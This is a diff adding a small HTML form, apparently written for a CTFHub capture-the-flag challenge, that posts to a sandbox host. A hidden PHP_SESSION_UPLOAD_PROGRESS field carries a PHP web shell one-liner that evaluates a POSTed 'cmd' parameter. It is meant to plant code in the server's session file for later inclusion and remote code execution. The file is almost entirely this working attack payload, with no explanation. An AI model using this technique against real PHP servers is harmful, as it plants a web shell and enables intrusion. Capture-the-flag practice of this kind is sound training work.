@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+	<meta charset="utf-8">
+</head>
+<body>
+	<form action="http://challenge-1801bd99e6b6dad2.sandbox.ctfhub.com:10800/" method="POST" enctype="multipart/form-data"><!-- 	
+不对字符编码-->
+	    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="<?php eval($_POST['cmd']); ?>" />
+	    <input type="file" name="file" />
+	    <input type="submit" value="go" />
+	</form>
+</body>
+</html>
